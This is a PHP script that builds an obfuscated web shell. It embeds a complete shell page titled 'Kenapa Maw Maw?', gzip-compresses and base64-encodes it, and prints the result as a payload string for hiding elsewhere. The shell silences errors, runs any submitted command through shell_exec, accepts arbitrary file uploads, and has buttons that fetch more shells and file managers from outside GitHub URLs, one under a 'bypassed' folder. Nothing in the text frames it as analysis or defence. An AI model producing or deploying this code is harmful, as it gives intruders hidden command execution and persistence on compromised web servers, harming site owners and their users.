<?php
$code = <<<'EOD'
<?php
error_reporting(0);
set_time_limit(0);
ini_set('display_errors', 0);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kenapa Maw Maw?</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #111; color: #0f0; text-align: center; }
        textarea, input, button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 5px; margin: 5px; }
        textarea { width: 90%; height: 200px; }
        input { width: 70%; }
        button { cursor: pointer; }
        .output-box { background: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 10px auto; width: 90%; text-align: left; min-height: 100px; overflow: auto; }
    </style>
	</head>
	<body>

    <h2>Kenapa Maw Maw?</h2>
    <form method="POST">
        <input type="text" name="cmd" placeholder="Enter command..." autofocus>
        <button type="submit">Run</button>
    </form>

    <?php
    if (isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        echo "<div class='output-box'><pre>" . shell_exec($cmd) . "</pre></div>";
    }
    ?>

    <hr>

    <h2>File Upload</h2>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit" name="upload">Upload</button>
    </form>

    <?php
    if (isset($_POST['upload'])) {
        $file = $_FILES['file']['name'];
        $tmp = $_FILES['file']['tmp_name'];
        if (move_uploaded_file($tmp, $file)) {
            echo "<p>File uploaded: <b>$file</b></p>";
        } else {
            echo "<p>Upload failed!</p>";
        }
    }
    ?>

    <hr>

    <h2>Panggil Mahluk Dari Alam Gaib</h2>
    <form method="POST">
        <button type="submit" name="spawn1">Tini FM</button>
        <button type="submit" name="spawn2">Gecko</button>
        <button type="submit" name="spawn3">Iron Man</button>
    </form>

    <?php
    function downloadFile($url, $saveAs) {
        $content = file_get_contents($url);
        if ($content) {
            file_put_contents($saveAs, $content);
            echo "<p>File <b>$saveAs</b> downloaded successfully!</p>";
        } else {
            echo "<p>Failed to download <b>$saveAs</b></p>";
        }
    }

    if (isset($_POST['spawn1'])) {
        downloadFile('https://raw.githubusercontent.com/maw3six/File-Manager/refs/heads/main/tiny.php', 'maw-tiny.php');
    }
    if (isset($_POST['spawn2'])) {
        downloadFile('https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/Log1n.php', 'maw-gecko.php');
    }
    if (isset($_POST['spawn3'])) {
        downloadFile('https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/ironman.php', 'maw-iron.php');
    }
    ?>

</body>
</html>
EOD;

$compressed = gzcompress($code);
$encoded = base64_encode($compressed);

echo '$payload = "' . $encoded . '";';
?>
